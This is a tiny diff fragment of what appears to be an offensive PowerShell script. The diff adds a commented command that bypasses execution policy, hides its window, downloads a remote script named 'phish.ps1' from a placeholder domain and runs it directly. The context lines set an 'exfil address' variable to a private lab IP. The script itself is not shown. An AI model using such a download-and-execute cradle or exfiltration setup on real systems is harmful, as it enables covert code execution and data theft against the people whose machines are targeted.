@@ -1,3 +1,5 @@
+## powershell -ep bypass -WindowStyle hidden -c "Invoke-WebRequest -URI 'https://<domain>.com/phish.ps1'|iex"
+
 # exfil address
 $exfilServer = "192.168.56.112"
 
